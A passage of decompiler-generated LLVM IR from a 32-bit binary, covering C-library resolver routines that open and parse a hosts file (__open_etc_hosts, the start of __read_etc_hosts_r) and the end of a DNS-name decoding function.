  %v0_10027e24 = load i32, i32* @r30, align 4
  %v1_10027e24 = add i32 %v0_10027e24, 10
  store i32 %v1_10027e24, i32* %r5.global-to-local, align 4
  %v0_10027e28 = load i32, i32* @r28, align 4
  %v1_10027e28 = add i32 %v0_10027e28, 10
  store i32 %v1_10027e28, i32* %r6.global-to-local, align 4
  %v0_10027e2c = load i32, i32* @r26, align 4
  %v2_10027e2c = add i32 %v0_10027e2c, %v0_10027e28
  %v3_10027e2c = inttoptr i32 %v2_10027e2c to i8*
  %v4_10027e2c = load i8, i8* %v3_10027e2c, align 1
  %v5_10027e2c = zext i8 %v4_10027e2c to i32
  store i32 %v5_10027e2c, i32* %r0.global-to-local, align 4
  %v1_10027e30 = add i32 %v0_10027e24, 1
  %v2_10027e30 = inttoptr i32 %v1_10027e30 to i8*
  %v3_10027e30 = load i8, i8* %v2_10027e30, align 1
  %v4_10027e30 = zext i8 %v3_10027e30 to i32
  store i32 %v4_10027e30, i32* %r9.global-to-local, align 4
  %v1_10027e34 = mul nuw nsw i32 %v5_10027e2c, 256
  %v2_10027e38 = or i32 %v4_10027e30, %v1_10027e34
  store i32 %v2_10027e38, i32* %r0.global-to-local, align 4
  %v1_10027e3c = load i32, i32* @r31, align 4
  %v2_10027e3c = add i32 %v1_10027e3c, 4
  %v3_10027e3c = inttoptr i32 %v2_10027e3c to i32*
  store i32 %v2_10027e38, i32* %v3_10027e3c, align 4
  %v0_10027e40 = load i32, i32* @r30, align 4
  %v1_10027e40 = add i32 %v0_10027e40, 2
  %v2_10027e40 = inttoptr i32 %v1_10027e40 to i8*
  %v3_10027e40 = load i8, i8* %v2_10027e40, align 1
  %v4_10027e40 = zext i8 %v3_10027e40 to i32
  store i32 %v4_10027e40, i32* %r0.global-to-local, align 4
  %v0_10027e44 = load i32, i32* @r8, align 4
  %v1_10027e44 = add i32 %v0_10027e44, 1
  %v2_10027e44 = inttoptr i32 %v1_10027e44 to i8*
  %v3_10027e44 = load i8, i8* %v2_10027e44, align 1
  %v4_10027e44 = zext i8 %v3_10027e44 to i32
  store i32 %v4_10027e44, i32* %r9.global-to-local, align 4
  %v1_10027e48 = mul nuw nsw i32 %v4_10027e40, 256
  %v2_10027e4c = or i32 %v4_10027e44, %v1_10027e48
  store i32 %v2_10027e4c, i32* %r0.global-to-local, align 4
  %v1_10027e50 = load i32, i32* @r31, align 4
  %v2_10027e50 = add i32 %v1_10027e50, 8
  %v3_10027e50 = inttoptr i32 %v2_10027e50 to i32*
  store i32 %v2_10027e4c, i32* %v3_10027e50, align 4
  %v0_10027e54 = load i32, i32* @r8, align 4
  %v1_10027e54 = add i32 %v0_10027e54, 2
  %v2_10027e54 = inttoptr i32 %v1_10027e54 to i8*
  %v3_10027e54 = load i8, i8* %v2_10027e54, align 1
  %v4_10027e54 = zext i8 %v3_10027e54 to i32
  store i32 %v4_10027e54, i32* %r0.global-to-local, align 4
  %v0_10027e58 = load i32, i32* @r10, align 4
  %v1_10027e58 = add i32 %v0_10027e58, 1
  %v2_10027e58 = inttoptr i32 %v1_10027e58 to i8*
  %v3_10027e58 = load i8, i8* %v2_10027e58, align 1
  %v4_10027e58 = zext i8 %v3_10027e58 to i32
  %v1_10027e5c = add i32 %v0_10027e58, 3
  %v2_10027e5c = inttoptr i32 %v1_10027e5c to i8*
  %v3_10027e5c = load i8, i8* %v2_10027e5c, align 1
  %v4_10027e5c = zext i8 %v3_10027e5c to i32
  %v1_10027e60 = add i32 %v0_10027e58, 2
  %v2_10027e60 = inttoptr i32 %v1_10027e60 to i8*
  %v3_10027e60 = load i8, i8* %v2_10027e60, align 1
  %v4_10027e60 = zext i8 %v3_10027e60 to i32
  %v1_10027e64 = mul nuw i32 %v4_10027e54, 16777216
  %v1_10027e68 = mul nuw nsw i32 %v4_10027e58, 65536
  %v2_10027e6c = or i32 %v1_10027e68, %v1_10027e64
  %v2_10027e70 = or i32 %v2_10027e6c, %v4_10027e5c
  store i32 %v2_10027e70, i32* %r0.global-to-local, align 4
  %v1_10027e74 = mul nuw nsw i32 %v4_10027e60, 256
  %v2_10027e78 = or i32 %v1_10027e74, %v2_10027e70
  store i32 %v2_10027e78, i32* %r9.global-to-local, align 4
  %v1_10027e7c = load i32, i32* @r31, align 4
  %v2_10027e7c = add i32 %v1_10027e7c, 12
  %v3_10027e7c = inttoptr i32 %v2_10027e7c to i32*
  store i32 %v2_10027e78, i32* %v3_10027e7c, align 4
  %v0_10027e80 = load i32, i32* @r8, align 4
  %v1_10027e80 = add i32 %v0_10027e80, 6
  %v2_10027e80 = inttoptr i32 %v1_10027e80 to i8*
  %v3_10027e80 = load i8, i8* %v2_10027e80, align 1
  %v4_10027e80 = zext i8 %v3_10027e80 to i32
  store i32 %v4_10027e80, i32* %r9.global-to-local, align 4
  %v0_10027e84 = load i32, i32* @r30, align 4
  %v1_10027e84 = add i32 %v0_10027e84, 9
  %v2_10027e84 = inttoptr i32 %v1_10027e84 to i8*
  %v3_10027e84 = load i8, i8* %v2_10027e84, align 1
  %v4_10027e84 = zext i8 %v3_10027e84 to i32
  store i32 %v4_10027e84, i32* %r0.global-to-local, align 4
  %v0_10027e88 = load i32, i32* %r6.global-to-local, align 4
  %v1_10027e88 = load i32, i32* @r31, align 4
  %v2_10027e88 = add i32 %v1_10027e88, 24
  %v3_10027e88 = inttoptr i32 %v2_10027e88 to i32*
  store i32 %v0_10027e88, i32* %v3_10027e88, align 4
  %v0_10027e8c = load i32, i32* %r9.global-to-local, align 4
  %v1_10027e8c = mul i32 %v0_10027e8c, 256
  store i32 %v1_10027e8c, i32* %r9.global-to-local, align 4
  %v0_10027e90 = load i32, i32* %r5.global-to-local, align 4
  %v1_10027e90 = load i32, i32* @r31, align 4
  %v2_10027e90 = add i32 %v1_10027e90, 20
  %v3_10027e90 = inttoptr i32 %v2_10027e90 to i32*
  store i32 %v0_10027e90, i32* %v3_10027e90, align 4
  %v0_10027e94 = load i32, i32* %r9.global-to-local, align 4
  %v1_10027e94 = load i32, i32* %r0.global-to-local, align 4
  %v2_10027e94 = or i32 %v1_10027e94, %v0_10027e94
  store i32 %v2_10027e94, i32* %r9.global-to-local, align 4
  %v0_10027e98 = load i32, i32* @r29, align 4
  %v2_10027e98 = icmp slt i32 %v0_10027e98, %v2_10027e94
  %v1_10027e9c = add i32 %v2_10027e94, 10
  store i32 %v1_10027e9c, i32* %r0.global-to-local, align 4
  %v0_10027ea0 = load i32, i32* @r27, align 4
  %v2_10027ea0 = add i32 %v0_10027ea0, %v1_10027e9c
  store i32 %v2_10027ea0, i32* @r27, align 4
  %v1_10027ea4 = load i32, i32* @r31, align 4
  %v2_10027ea4 = add i32 %v1_10027ea4, 16
  %v3_10027ea4 = inttoptr i32 %v2_10027ea4 to i32*
  store i32 %v2_10027e94, i32* %v3_10027ea4, align 4
  br i1 %v2_10027e98, label %dec_label_pc_10027eac, label %dec_label_pc_10027e14.dec_label_pc_10027eb0_crit_edge

dec_label_pc_10027e14.dec_label_pc_10027eb0_crit_edge: ; preds = %dec_label_pc_10027e14
  %v0_10027eb4.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_10027eb0

dec_label_pc_10027eac:                            ; preds = %dec_label_pc_10027e14
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_10027eb0

dec_label_pc_10027eb0:                            ; preds = %dec_label_pc_10027e14.dec_label_pc_10027eb0_crit_edge, %entry, %dec_label_pc_10027e0c, %dec_label_pc_10027eac
  %v0_10027eb4 = phi i32 [ %v0_10027eb4.pre, %dec_label_pc_10027e14.dec_label_pc_10027eb0_crit_edge ], [ %v4_10027de4, %entry ], [ %v1_10027df4, %dec_label_pc_10027e0c ], [ -1, %dec_label_pc_10027eac ]
  store i32 %v0_10027dbc, i32* %r0.global-to-local, align 4
  ret i32 %v0_10027eb4

; uselistorder directives
  uselistorder i32 %v2_10027e94, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10027df4, { 1, 2, 0, 3 }
  uselistorder i32 %v4_10027de4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10027dc4, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 9, { 28, 29, 30, 5, 16, 32, 6, 33, 7, 34, 3, 31, 14, 15, 35, 36, 37, 8, 38, 39, 9, 17, 40, 10, 4, 11, 12, 13, 1, 0, 18, 19, 20, 21, 22, 23, 24, 25, 2, 26, 27 }
  uselistorder i32 3, { 131, 132, 133, 134, 135, 136, 137, 41, 138, 3, 97, 98, 149, 4, 99, 100, 101, 0, 12, 42, 158, 44, 43, 22, 45, 139, 21, 102, 103, 104, 13, 1, 147, 148, 5, 140, 141, 150, 151, 46, 152, 153, 29, 28, 47, 48, 49, 50, 51, 105, 160, 161, 167, 159, 129, 30, 106, 14, 15, 107, 143, 92, 93, 94, 95, 96, 6, 7, 142, 8, 9, 154, 155, 10, 173, 174, 175, 169, 170, 171, 172, 24, 157, 156, 144, 52, 11, 25, 108, 165, 109, 16, 110, 163, 168, 164, 145, 53, 146, 17, 18, 166, 162, 111, 40, 19, 20, 112, 54, 55, 56, 57, 58, 26, 59, 60, 61, 62, 63, 64, 65, 31, 66, 67, 68, 69, 2, 113, 32, 70, 114, 115, 116, 117, 71, 118, 119, 72, 120, 73, 74, 33, 75, 121, 76, 34, 77, 122, 123, 78, 35, 79, 124, 80, 36, 81, 125, 27, 126, 82, 83, 84, 37, 85, 127, 86, 38, 87, 88, 39, 89, 128, 90, 130, 91, 23 }
  uselistorder i32 (i32)* @__GI_strdup, { 2, 1, 0, 4, 3 }
  uselistorder i32 -10, { 5, 0, 2, 3, 1, 4 }
  uselistorder i32 (i32, i32, i32, i32)* @__decode_dotted, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_10027eb0, { 3, 0, 2, 1 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v0_10027ecc = load i32, i32* @lr, align 4
  store i32 268599024, i32* @lr, align 4
  %v3_10027eec = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_1002fc38.1425 to i32), i32 ptrtoint (i32* @global_var_1002fb18.1347 to i32))
  %v3_10027ef4 = icmp eq i32 %v3_10027eec, 0
  br i1 %v3_10027ef4, label %dec_label_pc_10027efc, label %dec_label_pc_10027f18

dec_label_pc_10027efc:                            ; preds = %entry
  %v0_10027ef0 = load i32, i32* @r29, align 4
  store i32 %v0_10027ecc, i32* @lr, align 4
  %v3_10027f14 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_1002fc44.1426 to i32), i32 %v0_10027ef0)
  br label %dec_label_pc_10027f18

dec_label_pc_10027f18:                            ; preds = %entry, %dec_label_pc_10027efc
  %v0_10027f28 = phi i32 [ %v3_10027eec, %entry ], [ %v3_10027f14, %dec_label_pc_10027efc ]
  ret i32 %v0_10027f28

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 14, 3, 2, 1, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002fb18.1347 to i32), { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_10027f18, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg7, i32* %r9.global-to-local, align 4
  store i32 %arg6, i32* @r8, align 4
  %tmp = ptrtoint i32* %arg5 to i32
  %v0_10027f30 = load i32, i32* @lr, align 4
  %v1_10027f38 = sub i32 0, %arg6
  %v1_10027f3c = urem i32 %v1_10027f38, 4
  store i32 %v1_10027f3c, i32* %r0.global-to-local, align 4
  %v3_10027f3c = icmp eq i32 %v1_10027f3c, 0
  store i32 %arg6, i32* @r30, align 4
  store i32 %arg1, i32* @r20, align 4
  store i32 %arg2, i32* %r15.global-to-local, align 4
  store i32 %arg3, i32* @r19, align 4
  store i32 %arg4, i32* @r18, align 4
  store i32 %tmp, i32* @r28, align 4
  %v0_10027f5c = load i32, i32* @r10, align 4
  store i32 %v0_10027f5c, i32* @r17, align 4
  store i32 %arg8, i32* @r16, align 4
  %v0_10027f78.pr = load i32, i32* %r9.global-to-local, align 4
  br i1 %v3_10027f3c, label %dec_label_pc_10027f78, label %dec_label_pc_10027f68

dec_label_pc_10027f68:                            ; preds = %entry
  %v2_10027f68 = icmp ult i32 %v0_10027f78.pr, %v1_10027f3c
  br i1 %v2_10027f68, label %dec_label_pc_1002822c, label %dec_label_pc_10027f70

dec_label_pc_10027f70:                            ; preds = %dec_label_pc_10027f68
  %v2_10027f70 = sub i32 %v0_10027f78.pr, %v1_10027f3c
  store i32 %v2_10027f70, i32* %r9.global-to-local, align 4
  %v2_10027f74 = add i32 %v1_10027f3c, %arg6
  store i32 %v2_10027f74, i32* @r30, align 4
  br label %dec_label_pc_10027f78

dec_label_pc_10027f78:                            ; preds = %entry, %dec_label_pc_10027f70
  %v0_10027f84 = phi i32 [ %v2_10027f74, %dec_label_pc_10027f70 ], [ %arg6, %entry ]
  %v0_10027f88 = phi i32 [ %v2_10027f70, %dec_label_pc_10027f70 ], [ %v0_10027f78.pr, %entry ]
  %tmp49 = icmp ult i32 %v0_10027f88, 32
  br i1 %tmp49, label %dec_label_pc_1002822c, label %dec_label_pc_10027f80

dec_label_pc_10027f80:                            ; preds = %dec_label_pc_10027f78
  %v3_10027f80 = icmp eq i32 %arg4, 1
  %v1_10027f84 = add i32 %v0_10027f84, 32
  store i32 %v1_10027f84, i32* @r24, align 4
  %v1_10027f88 = add i32 %v0_10027f88, -32
  store i32 %v1_10027f88, i32* @r27, align 4
  br i1 %v3_10027f80, label %dec_label_pc_10028088, label %dec_label_pc_10027f90

dec_label_pc_10027f90:                            ; preds = %dec_label_pc_10027f80
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10027f98 = inttoptr i32 %arg8 to i32*
  store i32 -1, i32* %v2_10027f98, align 4
  %tmp50 = icmp ult i32 %v1_10027f88, 4
  br i1 %tmp50, label %dec_label_pc_1002822c, label %dec_label_pc_10027fa0

dec_label_pc_10027fa0:                            ; preds = %dec_label_pc_10027f90
  %v0_10027fa0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10027fa0 = add i32 %v0_10027fa0, -36
  store i32 %v1_10027fa0, i32* %r0.global-to-local, align 4
  %tmp51 = icmp ult i32 %v1_10027fa0, 8
  br i1 %tmp51, label %dec_label_pc_1002822c, label %dec_label_pc_10027fac

dec_label_pc_10027fac:                            ; preds = %dec_label_pc_10027fa0
  %v0_10027fac = load i32, i32* @r27, align 4
  %tmp52 = icmp ult i32 %v0_10027fac, 16
  br i1 %tmp52, label %dec_label_pc_1002822c, label %dec_label_pc_10027fb4

dec_label_pc_10027fb4:                            ; preds = %dec_label_pc_10027fac
  %v1_10027fb4 = add i32 %v0_10027fa0, -48
  store i32 %v1_10027fb4, i32* %r0.global-to-local, align 4
  %tmp53 = icmp ult i32 %v1_10027fb4, 8
  br i1 %tmp53, label %dec_label_pc_1002822c, label %dec_label_pc_10027fc0

dec_label_pc_10027fc0:                            ; preds = %dec_label_pc_10027fb4
  %v1_10027fc0 = add i32 %v0_10027fa0, -56
  store i32 %v1_10027fc0, i32* %r0.global-to-local, align 4
  %v1_10027fc4 = add i32 %v0_10027fa0, -44
  store i32 %v1_10027fc4, i32* @r27, align 4
  %v3_10027fc8 = icmp ugt i32 %v1_10027fc0, %v1_10027fc4
  %v0_10027fcc = load i32, i32* @r30, align 4
  %v1_10027fcc = add i32 %v0_10027fcc, 36
  store i32 %v1_10027fcc, i32* @r29, align 4
  %v1_10027fd0 = add i32 %v0_10027fcc, 48
  store i32 %v1_10027fd0, i32* @r26, align 4
  %v1_10027fd4 = add i32 %v0_10027fcc, 44
  store i32 %v1_10027fd4, i32* @r31, align 4
  br i1 %v3_10027fc8, label %dec_label_pc_10027fe4, label %dec_label_pc_10027fdc

dec_label_pc_10027fdc:                            ; preds = %dec_label_pc_10027fc0
  store i32 %v1_10027fc0, i32* @r27, align 4
  %v1_10027fe0 = add i32 %v0_10027fcc, 56
  store i32 %v1_10027fe0, i32* @r31, align 4
  br label %dec_label_pc_10027fe4

dec_label_pc_10027fe4:                            ; preds = %dec_label_pc_10027fc0, %dec_label_pc_10027fdc
  %v0_10027fe4 = phi i32 [ %v1_10027fc0, %dec_label_pc_10027fdc ], [ %v1_10027fc4, %dec_label_pc_10027fc0 ]
  %tmp54 = icmp ult i32 %v0_10027fe4, 80
  br i1 %tmp54, label %dec_label_pc_1002822c, label %dec_label_pc_10027fec

dec_label_pc_10027fec:                            ; preds = %dec_label_pc_10027fe4
  store i32 268599280, i32* @lr, align 4
  %v0_10027fec = call i32 @__open_etc_hosts()
  store i32 %v0_10027fec, i32* @r20, align 4
  %v3_10027ff0 = icmp eq i32 %v0_10027fec, 0
  br i1 %v3_10027ff0, label %dec_label_pc_10028010, label %dec_label_pc_10027ff8

dec_label_pc_10027ff8:                            ; preds = %dec_label_pc_10027fec
  %v0_10027ff8 = load i32, i32* @r24, align 4
  store i32 %v0_10027ff8, i32* @r25, align 4
  %v0_10027ffc = load i32, i32* @r29, align 4
  store i32 %v0_10027ffc, i32* @r22, align 4
  %v0_10028000 = load i32, i32* @r26, align 4
  store i32 %v0_10028000, i32* @r23, align 4
  %v0_10028004 = load i32, i32* @r31, align 4
  store i32 %v0_10028004, i32* @r24, align 4
  store i32 %v0_10027ff8, i32* @r21, align 4
  %v1_100280a0.pre = load i32, i32* @r16, align 4
  br label %dec_label_pc_10028098

dec_label_pc_10028010:                            ; preds = %dec_label_pc_10027fec
  %v1_10028010 = load i32, i32* @r17, align 4
  %v2_10028010 = inttoptr i32 %v1_10028010 to i32*
  store i32 0, i32* %v2_10028010, align 4
  %v0_10028014 = call i32 @__errno_location()
  %v1_10028018 = inttoptr i32 %v0_10028014 to i32*
  %v2_10028018 = load i32, i32* %v1_10028018, align 4
  store i32 %v2_10028018, i32* @r26, align 4
  br label %dec_label_pc_10028230

dec_label_pc_10028020:                            ; preds = %dec_label_pc_100281c0
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10028024 = load i32, i32* @r25, align 4
  %v1_10028024 = load i32, i32* @r22, align 4
  %v2_10028024 = inttoptr i32 %v1_10028024 to i32*
  store i32 %v0_10028024, i32* %v2_10028024, align 4
  %v0_10028028 = load i32, i32* %r0.global-to-local, align 4
  %v1_10028028 = load i32, i32* @r22, align 4
  %v2_10028028 = add i32 %v1_10028028, 4
  %v3_10028028 = inttoptr i32 %v2_10028028 to i32*
  store i32 %v0_10028028, i32* %v3_10028028, align 4
  %v0_1002802c = load i32, i32* @r30, align 4
  %v1_1002802c = add i32 %v0_1002802c, 8
  store i32 %v1_1002802c, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_10028034 = add i32 %v0_1002802c, 4
  %v2_10028034 = inttoptr i32 %v1_10028034 to i32*
  %v3_10028034 = load i32, i32* %v2_10028034, align 4
  store i32 %v3_10028034, i32* %r0.global-to-local, align 4
  %v0_10028038 = load i32, i32* @r19, align 4
  %v1_10028038 = load i32, i32* @r28, align 4
  %v2_10028038 = add i32 %v1_10028038, 8
  %v3_10028038 = inttoptr i32 %v2_10028038 to i32*
  store i32 %v0_10028038, i32* %v3_10028038, align 4
  %v0_1002803c = load i32, i32* @r22, align 4
  %v1_1002803c = load i32, i32* @r28, align 4
  %v2_1002803c = add i32 %v1_1002803c, 16
  %v3_1002803c = inttoptr i32 %v2_1002803c to i32*
  store i32 %v0_1002803c, i32* %v3_1002803c, align 4
  %v0_10028040 = load i32, i32* %r0.global-to-local, align 4
  %v1_10028040 = load i32, i32* @r28, align 4
  %v2_10028040 = inttoptr i32 %v1_10028040 to i32*
  store i32 %v0_10028040, i32* %v2_10028040, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_10028048 = load i32, i32* @r28, align 4
  %v2_10028048 = add i32 %v1_10028048, 12
  %v3_10028048 = inttoptr i32 %v2_10028048 to i32*
  store i32 4, i32* %v3_10028048, align 4
  br label %dec_label_pc_1002807c

dec_label_pc_10028050:                            ; preds = %dec_label_pc_100281e4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10028054 = load i32, i32* @r21, align 4
  %v1_10028054 = load i32, i32* @r23, align 4
  %v2_10028054 = inttoptr i32 %v1_10028054 to i32*
  store i32 %v0_10028054, i32* %v2_10028054, align 4
  %v0_10028058 = load i32, i32* %r0.global-to-local, align 4
  %v1_10028058 = load i32, i32* @r23, align 4
  %v2_10028058 = add i32 %v1_10028058, 4
  %v3_10028058 = inttoptr i32 %v2_10028058 to i32*
  store i32 %v0_10028058, i32* %v3_10028058, align 4
  %v0_1002805c = load i32, i32* @r30, align 4
  %v1_1002805c = add i32 %v0_1002805c, 8
  store i32 %v1_1002805c, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_10028064 = add i32 %v0_1002805c, 4
  %v2_10028064 = inttoptr i32 %v1_10028064 to i32*
  %v3_10028064 = load i32, i32* %v2_10028064, align 4
  store i32 %v3_10028064, i32* %r0.global-to-local, align 4
  %v0_10028068 = load i32, i32* @r19, align 4
  %v1_10028068 = load i32, i32* @r28, align 4
  %v2_10028068 = add i32 %v1_10028068, 8
  %v3_10028068 = inttoptr i32 %v2_10028068 to i32*
  store i32 %v0_10028068, i32* %v3_10028068, align 4
  %v0_1002806c = load i32, i32* @r23, align 4
  %v1_1002806c = load i32, i32* @r28, align 4
  %v2_1002806c = add i32 %v1_1002806c, 16
  %v3_1002806c = inttoptr i32 %v2_1002806c to i32*
  store i32 %v0_1002806c, i32* %v3_1002806c, align 4
  %v0_10028070 = load i32, i32* %r0.global-to-local, align 4
  %v1_10028070 = load i32, i32* @r28, align 4
  %v2_10028070 = inttoptr i32 %v1_10028070 to i32*
  store i32 %v0_10028070, i32* %v2_10028070, align 4
  store i32 16, i32* %r0.global-to-local, align 4
  %v1_10028078 = load i32, i32* @r28, align 4
  %v2_10028078 = add i32 %v1_10028078, 12
  %v3_10028078 = inttoptr i32 %v2_10028078 to i32*
  store i32 16, i32* %v3_10028078, align 4
  br label %dec_label_pc_1002807c

dec_label_pc_1002807c:                            ; preds = %dec_label_pc_10028020, %dec_label_pc_10028050
  %v0_1002807c = load i32, i32* %r9.global-to-local, align 4
  %v1_1002807c = load i32, i32* @r28, align 4
  %v2_1002807c = add i32 %v1_1002807c, 4
  %v3_1002807c = inttoptr i32 %v2_1002807c to i32*
  store i32 %v0_1002807c, i32* %v3_1002807c, align 4
  %v0_10028080 = load i32, i32* @r28, align 4
  %v1_10028080 = load i32, i32* @r17, align 4
  %v2_10028080 = inttoptr i32 %v1_10028080 to i32*
  store i32 %v0_10028080, i32* %v2_10028080, align 4
  br label %dec_label_pc_10028218

dec_label_pc_10028088:                            ; preds = %dec_label_pc_10027f80
  store i32 0, i32* @r25, align 4
  store i32 0, i32* @r22, align 4
  store i32 0, i32* @r21, align 4
  store i32 0, i32* @r23, align 4
  br label %dec_label_pc_10028098

dec_label_pc_10028098:                            ; preds = %dec_label_pc_10027ff8, %dec_label_pc_10028088
  %v1_100280a0 = phi i32 [ %v1_100280a0.pre, %dec_label_pc_10027ff8 ], [ %arg8, %dec_label_pc_10028088 ]
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r26, align 4
  %v2_100280a0 = inttoptr i32 %v1_100280a0 to i32*
  store i32 1, i32* %v2_100280a0, align 4
  br label %dec_label_pc_10028200

dec_label_pc_100280a8:                            ; preds = %dec_label_pc_10028200
  %v0_100280a8 = load i32, i32* @r24, align 4
  store i32 %v0_100280a8, i32* @r3, align 4
  store i32 268599476, i32* @lr, align 4
  %v2_100280b0 = call i32 @__GI_strchr(i32 %v0_100280a8, i32 35)
  %v4_100280b4 = icmp eq i32 %v2_100280b0, 0
  br i1 %v4_100280b4, label %dec_label_pc_100280c4, label %dec_label_pc_100280bc

dec_label_pc_100280bc:                            ; preds = %dec_label_pc_100280a8
  %v3_100280b0 = inttoptr i32 %v2_100280b0 to i8*
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %v3_100280b0, align 1
  br label %dec_label_pc_100280c4

dec_label_pc_100280c4:                            ; preds = %dec_label_pc_100280a8, %dec_label_pc_100280bc
  %v0_100280c4 = load i32, i32* @r24, align 4
  store i32 %v0_100280c4, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  %v1_1002814017 = inttoptr i32 %v0_100280c4 to i8*
  %v2_1002814018 = load i8, i8* %v1_1002814017, align 1
  %v3_1002814019 = zext i8 %v2_1002814018 to i32
  store i32 %v3_1002814019, i32* %r0.global-to-local, align 4
  %v3_1002814421 = icmp eq i8 %v2_1002814018, 0
  br i1 %v3_1002814421, label %dec_label_pc_1002814c, label %dec_label_pc_100280dc.preheader

dec_label_pc_100280d0:                            ; preds = %dec_label_pc_100280ec
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_100280d4 = inttoptr i32 %v0_10028110 to i8*
  store i8 0, i8* %v3_100280d4, align 1
  %v0_100280d8 = load i32, i32* %r11.global-to-local, align 4
  %v1_100280d8 = add i32 %v0_100280d8, 1
  store i32 %v1_100280d8, i32* %r11.global-to-local, align 4
  %v1_100280dc = inttoptr i32 %v1_100280d8 to i8*
  %v2_100280dc = load i8, i8* %v1_100280dc, align 1
  %v3_100280dc = zext i8 %v2_100280dc to i32
  store i32 %v3_100280dc, i32* %r0.global-to-local, align 4
  %v3_100280e0 = icmp eq i8 %v2_100280dc, 0
  %v1_100280e4 = mul nuw nsw i32 %v3_100280dc, 2
  store i32 %v1_100280e4, i32* @r10, align 4
  br i1 %v3_100280e0, label %dec_label_pc_1002814c, label %dec_label_pc_100280ec

dec_label_pc_100280ec:                            ; preds = %dec_label_pc_100280dc.preheader, %dec_label_pc_100280d0
  %v0_10028110 = phi i32 [ %v1_100280d8, %dec_label_pc_100280d0 ], [ %v0_100280dc2, %dec_label_pc_100280dc.preheader ]
  %v0_100280f4 = phi i32 [ %v1_100280e4, %dec_label_pc_100280d0 ], [ %v1_100280e48, %dec_label_pc_100280dc.preheader ]
  %v3_100280f0 = load i32, i32* @global_var_1004513c, align 4
  store i32 %v3_100280f0, i32* %r9.global-to-local, align 4
  %v2_100280f4 = add i32 %v3_100280f0, %v0_100280f4
  %v3_100280f4 = inttoptr i32 %v2_100280f4 to i16*
  %v4_100280f4 = load i16, i16* %v3_100280f4, align 2
  %v5_100280f4 = zext i16 %v4_100280f4 to i32
  store i32 %v5_100280f4, i32* %r0.global-to-local, align 4
  %v1_100280f8 = and i32 %v5_100280f4, 32
  store i32 %v1_100280f8, i32* %r9.global-to-local, align 4
  %v3_100280f8 = icmp eq i32 %v1_100280f8, 0
  br i1 %v3_100280f8, label %dec_label_pc_10028100, label %dec_label_pc_100280d0

dec_label_pc_10028100:                            ; preds = %dec_label_pc_100280ec
  %v0_10028100 = load i32, i32* @r29, align 4
  %v2_10028100 = icmp sgt i32 %v0_10028100, 6
  br i1 %v2_10028100, label %dec_label_pc_1002811c.preheader, label %dec_label_pc_10028108

dec_label_pc_10028108:                            ; preds = %dec_label_pc_10028100
  %v1_10028108 = mul i32 %v0_10028100, 4
  store i32 %v1_10028108, i32* %r0.global-to-local, align 4
  %v1_1002810c = add i32 %v0_10028100, 1
  store i32 %v1_1002810c, i32* @r29, align 4
  %v1_10028110 = load i32, i32* @r30, align 4
  %v3_10028110 = add i32 %v1_10028110, %v1_10028108
  %v4_10028110 = inttoptr i32 %v3_10028110 to i32*
  store i32 %v0_10028110, i32* %v4_10028110, align 4
  %v0_1002811c9.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1002811c.preheader

dec_label_pc_1002811c.preheader:                  ; preds = %dec_label_pc_10028108, %dec_label_pc_10028100
  %v0_1002811c9 = phi i32 [ %v0_1002811c9.pre, %dec_label_pc_10028108 ], [ %v0_10028110, %dec_label_pc_10028100 ]
  %v1_1002811c10 = inttoptr i32 %v0_1002811c9 to i8*
  %v2_1002811c11 = load i8, i8* %v1_1002811c10, align 1
  %v3_1002811c12 = zext i8 %v2_1002811c11 to i32
  store i32 %v3_1002811c12, i32* %r0.global-to-local, align 4
  %v3_1002812014 = icmp eq i8 %v2_1002811c11, 0
  %v1_1002812415 = mul nuw nsw i32 %v3_1002811c12, 2
  store i32 %v1_1002812415, i32* @r10, align 4
  br i1 %v3_1002812014, label %dec_label_pc_10028140.loopexit, label %dec_label_pc_1002812c.lr.ph

dec_label_pc_1002812c.lr.ph:                      ; preds = %dec_label_pc_1002811c.preheader
  %v3_10028130.pre = load i32, i32* @global_var_1004513c, align 4
  br label %dec_label_pc_1002812c

dec_label_pc_10028118:                            ; preds = %dec_label_pc_1002812c
  %v1_10028118 = add i32 %v0_10028118, 1
  store i32 %v1_10028118, i32* %r11.global-to-local, align 4
  %v1_1002811c = inttoptr i32 %v1_10028118 to i8*
  %v2_1002811c = load i8, i8* %v1_1002811c, align 1
  %v3_1002811c = zext i8 %v2_1002811c to i32
  store i32 %v3_1002811c, i32* %r0.global-to-local, align 4
  %v3_10028120 = icmp eq i8 %v2_1002811c, 0
  %v1_10028124 = mul nuw nsw i32 %v3_1002811c, 2
  store i32 %v1_10028124, i32* @r10, align 4
  br i1 %v3_10028120, label %dec_label_pc_10028140.loopexit, label %dec_label_pc_1002812c

